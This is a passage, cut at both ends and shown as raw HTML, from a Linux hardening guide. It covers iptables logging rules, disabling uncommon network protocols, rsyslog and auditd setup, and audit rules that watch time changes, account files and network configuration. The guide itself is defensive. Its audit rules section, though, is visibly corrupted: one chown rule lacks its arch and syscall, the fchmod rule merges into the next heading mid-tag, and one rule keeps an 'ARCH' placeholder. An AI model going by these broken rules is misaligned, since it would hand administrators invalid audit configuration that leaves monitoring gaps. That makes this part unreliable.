class=\"nt\">-s</span> 240.0.0.0/5 <span class=\"nt\">-j</span> LOG <span class=\"nt\">--log-prefix</span> <span class=\"s2\">\"IP DROP SPOOF E: \"</span>\n<span class=\"nt\">-A</span> INPUT <span class=\"nt\">-i</span> eth0 <span class=\"nt\">-d</span> 127.0.0.0/8 <span class=\"nt\">-j</span> LOG <span class=\"nt\">--log-prefix</span> <span class=\"s2\">\"IP DROP LOOPBACK: \"</span>\n<span class=\"c\"># Accept any established connections</span>\n<span class=\"nt\">-A</span> RH-Firewall-1-INPUT <span class=\"nt\">-m</span> state <span class=\"nt\">--state</span> ESTABLISHED,RELATED <span class=\"nt\">-j</span> ACCEPT\n<span class=\"c\"># Accept ssh traffic. Restrict this to known ips if possible.</span>\n<span class=\"nt\">-A</span> RH-Firewall-1-INPUT <span class=\"nt\">-m</span> state <span class=\"nt\">--state</span> NEW <span class=\"nt\">-m</span> tcp <span class=\"nt\">-p</span> tcp <span class=\"nt\">--dport</span> 22 <span class=\"nt\">-j</span> ACCEPT\n<span class=\"c\">#Log and drop everything else</span>\n<span class=\"nt\">-A</span> RH-Firewall-1-INPUT <span class=\"nt\">-j</span> LOG\n<span class=\"nt\">-A</span> RH-Firewall-1-INPUT <span class=\"nt\">-j</span> DROP\nCOMMIT</code></pre> \n</figure> \n<h2 id=\"verify-iptables-enabled\">Verify iptables Enabled</h2> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nb\">sudo </span>systemctl <span class=\"nb\">enable </span>iptables\nsystemctl start iptables.service</code></pre> \n</figure> \n<h2 id=\"disable-uncommon-protocols\">Disable Uncommon Protocols</h2> \n<p>The following Protocols will be disabled:</p> \n<ul> \n <li>Datagram Congestion Control Protocol (DCCP)</li> \n <li>Stream Control Transmission Protocol (SCTP)</li> \n <li>Reliable Datagram Sockets (RDS)</li> \n <li>Transparent Inter-Process Communication (TIPC)</li> \n</ul> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nb\">echo</span> <span class=\"s2\">\"install dccp /bin/false\"</span> <span class=\"o\">&gt;</span> /etc/modprobe.d/dccp.conf\n<span class=\"nb\">echo</span> <span class=\"s2\">\"install sctp /bin/false\"</span> <span class=\"o\">&gt;</span> /etc/modprobe.d/sctp.conf\n<span class=\"nb\">echo</span> <span class=\"s2\">\"install rds /bin/false\"</span> <span class=\"o\">&gt;</span> /etc/modprobe.d/rds.conf\n<span class=\"nb\">echo</span> <span class=\"s2\">\"install tipc /bin/false\"</span> <span class=\"o\">&gt;</span> /etc/modprobe.d/tipc.conf</code></pre> \n</figure> \n<h2 id=\"ensure-rsyslog-is-installed\">Ensure Rsyslog is installed</h2> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">yum <span class=\"nt\">-y</span> <span class=\"nb\">install </span>rsyslog</code></pre> \n</figure> \n<h2 id=\"enable-rsyslog\">Enable Rsyslog</h2> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">systemctl <span class=\"nb\">enable </span>rsyslog.service\nsystemctl start rsyslog.service</code></pre> \n</figure> \n<h2 id=\"auditd---audit-daemon\">Auditd - Audit Daemon</h2> \n<h3 id=\"enable-auditd-service\">Enable auditd Service</h3> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">systemctl <span class=\"nb\">enable </span>auditd.service\nsystemctl start auditd.service</code></pre> \n</figure> \n<h3 id=\"audit-processes-which-start-prior-to-auditd\">Audit Processes Which Start Prior to auditd</h3> \n<p>Audit process which start before the Audit Daemon.</p> \n<p>Add the following line to <code>/etc/grub.conf</code>:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">kernel /vmlinuz-version ro <span class=\"nv\">vga</span><span class=\"o\">=</span>ext <span class=\"nv\">root</span><span class=\"o\">=</span>/dev/VolGroup00/LogVol00 rhgb quiet <span class=\"nv\">audit</span><span class=\"o\">=</span>1</code></pre> \n</figure> \n<h3 id=\"auditd-number-of-logs-retained\">Auditd Number of Logs Retained</h3> \n<p>Open <code>/etc/audit/auditd.conf</code> and add or modify:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">num_logs <span class=\"o\">=</span> 5</code></pre> \n</figure> \n<h3 id=\"auditd-max-log-file-size\">Auditd Max Log File Size</h3> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">max_log_file <span class=\"o\">=</span> 30MB</code></pre> \n</figure> \n<h3 id=\"auditd-max_log_file_action\">Auditd max_log_file_action</h3> \n<p>Open <code>/etc/audit/auditd.conf</code> and set this to rotate.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">max_log_file_action <span class=\"o\">=</span> rotate</code></pre> \n</figure> \n<h3 id=\"auditd-space_left\">Auditd space_left</h3> \n<p>Configure auditd to email you when space gets low, open <code>/etc/audit/auditd.conf</code> and modify the following:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">space_left_action <span class=\"o\">=</span> email</code></pre> \n</figure> \n<h3 id=\"auditd-admin_space_left\">Auditd admin_space_left</h3> \n<p>Configure auditd to halt when auditd log space is used up, forcing the system admin to rectify the space issue.</p> \n<p>On some systems where monitoring is less important another action could be leveraged.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">admin_space_left_action <span class=\"o\">=</span> halt</code></pre> \n</figure> \n<h3 id=\"auditd-mail_acct\">Auditd mail_acct</h3> \n<p>When space gets low auditd can send a email notification via email, to configure this and the following line to <code>/etc/audit/auditd.conf</code>:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">action_mail_acct <span class=\"o\">=</span> root</code></pre> \n</figure> \n<h3 id=\"configure-auditd-to-use-audispd-plugin\">Configure auditd to use audispd plugin</h3> \n<p>Auditd does not have the functionality to send logs directly to an external log server, however the audispd plugin pass audit records to the local syslog server, to enable this open <code>/etc/audisp/plugins.d/syslog.conf</code> and set the active line to yes, then restart audispd daemon:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nb\">sudo </span>service auditd restart</code></pre> \n</figure> \n<h3 id=\"auditd-rules-etcauditauditrules\">Auditd Rules: /etc/audit/audit.rules</h3> \n<p>Open <code>/etc/audit/audit.rules</code> and add the following lines to monitor various system files and activities:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"c\"># audit_time_rules - Record attempts to alter time through adjtime</span>\n<span class=\"nt\">-a</span> always,exit <span class=\"nt\">-F</span> <span class=\"nb\">arch</span><span class=\"o\">=</span>b64 <span class=\"nt\">-S</span> adjtimex <span class=\"nt\">-k</span> audit_time_rules\n\n<span class=\"c\"># audit_time_rules - Record attempts to alter time through settimeofday</span>\n<span class=\"nt\">-a</span> always,exit <span class=\"nt\">-F</span> <span class=\"nb\">arch</span><span class=\"o\">=</span>b64 <span class=\"nt\">-S</span> settimeofday <span class=\"nt\">-k</span> audit_time_rules\n\n<span class=\"c\"># audit_time_rules - Record Attempts to Alter Time Through stime</span>\n<span class=\"nt\">-a</span> always,exit <span class=\"nt\">-F</span> <span class=\"nb\">arch</span><span class=\"o\">=</span>b64 <span class=\"nt\">-S</span> adjtimex <span class=\"nt\">-S</span> settimeofday <span class=\"nt\">-S</span> clock_settime\n<span class=\"nt\">-k</span> audit_time_rules\n\n<span class=\"c\"># audit_time_rules - Record Attempts to Alter Time Through clock_settime</span>\n<span class=\"nt\">-a</span> always,exit <span class=\"nt\">-F</span> <span class=\"nb\">arch</span><span class=\"o\">=</span>b64 <span class=\"nt\">-S</span> clock_settime <span class=\"nt\">-k</span> audit_time_rules\n\n<span class=\"c\"># Record Attempts to Alter the localtime File</span>\n<span class=\"nt\">-w</span> /etc/localtime <span class=\"nt\">-p</span> wa <span class=\"nt\">-k</span> audit_time_rules\n\n<span class=\"c\"># Record Events that Modify User/Group Information</span>\n<span class=\"c\"># audit_account_changes</span>\n<span class=\"nt\">-w</span> /etc/group <span class=\"nt\">-p</span> wa <span class=\"nt\">-k</span> audit_account_changes\n<span class=\"nt\">-w</span> /etc/passwd <span class=\"nt\">-p</span> wa <span class=\"nt\">-k</span> audit_account_changes\n<span class=\"nt\">-w</span> /etc/gshadow <span class=\"nt\">-p</span> wa <span class=\"nt\">-k</span> audit_account_changes\n<span class=\"nt\">-w</span> /etc/shadow <span class=\"nt\">-p</span> wa <span class=\"nt\">-k</span> audit_account_changes\n<span class=\"nt\">-w</span> /etc/security/opasswd <span class=\"nt\">-p</span> wa <span class=\"nt\">-k</span> audit_account_changes\n\n<span class=\"c\"># Record Events that Modify the System's Network Environment</span>\n<span class=\"c\"># audit_network_modifications</span>\n<span class=\"nt\">-a</span> always,exit <span class=\"nt\">-F</span> <span class=\"nb\">arch</span><span class=\"o\">=</span>ARCH <span class=\"nt\">-S</span> sethostname <span class=\"nt\">-S</span> setdomainname <span class=\"nt\">-k</span> audit_network_modifications\n<span class=\"nt\">-w</span> /etc/issue <span class=\"nt\">-p</span> wa <span class=\"nt\">-k</span> audit_network_modifications\n<span class=\"nt\">-w</span> /etc/issue.net <span class=\"nt\">-p</span> wa <span class=\"nt\">-k</span> audit_network_modifications\n<span class=\"nt\">-w</span> /etc/hosts <span class=\"nt\">-p</span> wa <span class=\"nt\">-k</span> audit_network_modifications\n<span class=\"nt\">-w</span> /etc/sysconfig/network <span class=\"nt\">-p</span> wa <span class=\"nt\">-k</span> audit_network_modifications\n\n<span class=\"c\">#Record Events that Modify the System's Mandatory Access Controls</span>\n<span class=\"nt\">-w</span> /etc/selinux/ <span class=\"nt\">-p</span> wa <span class=\"nt\">-k</span> MAC-policy\n\n<span class=\"c\">#Record Events that Modify the System's Discretionary Access Controls - chmod</span>\n<span class=\"nt\">-a</span> always,exit <span class=\"nt\">-F</span> <span class=\"nb\">arch</span><span class=\"o\">=</span>b32 <span class=\"nt\">-S</span> <span class=\"nb\">chmod</span> <span class=\"nt\">-F</span> auid&gt;<span class=\"o\">=</span>500 <span class=\"nt\">-F</span> auid!<span class=\"o\">=</span>4294967295 <span class=\"nt\">-k</span> perm_mod\n<span class=\"nt\">-a</span> always,exit <span class=\"nt\">-F</span> <span class=\"nb\">arch</span><span class=\"o\">=</span>b64 <span class=\"nt\">-S</span> <span class=\"nb\">chmod</span>  <span class=\"nt\">-F</span> auid&gt;<span class=\"o\">=</span>500 <span class=\"nt\">-F</span> auid!<span class=\"o\">=</span>4294967295 <span class=\"nt\">-k</span> perm_mod\n\n<span class=\"c\">#Record Events that Modify the System's Discretionary Access Controls - chown</span>\n<span class=\"nt\">-a</span> always,exit <span class=\"nt\">-F</span> <span class=\"nb\">arch</span><span class=\"o\">=</span>b32 <span class=\"nt\">-S</span> <span class=\"nb\">chown</span> <span class=\"nt\">-F</span> auid&gt;<span class=\"o\">=</span>500 <span class=\"nt\">-F</span> auid!<span class=\"o\">=</span>4294967295 <span class=\"nt\">-k</span> perm_mod\n<span class=\"nt\">-a</span> always,exit <span class=\"nt\">-F</span> <span class=\"nt\">-F</span> auid!<span class=\"o\">=</span>4294967295 <span class=\"nt\">-k</span> perm_mod\n\n<span class=\"c\">#Record Events that Modify the System's Discretionary Access Controls - fchmod</span>\n<span class=\"nt\">-a</span> always,exit <span class=\"nt\">-F</span> <span class=\"nb\">arch</span><span class=\"o\">=</span>b32 <span class=\"nt\">-S</span> fchmod <span Discretionary Access Controls - fchmodat</span>\n<span class=\"nt\">-a</span> always,exit <span class=\"nt\">-F</span> <span class=\"nb\">arch</span><span class=\"o\">=</span>b32 <span
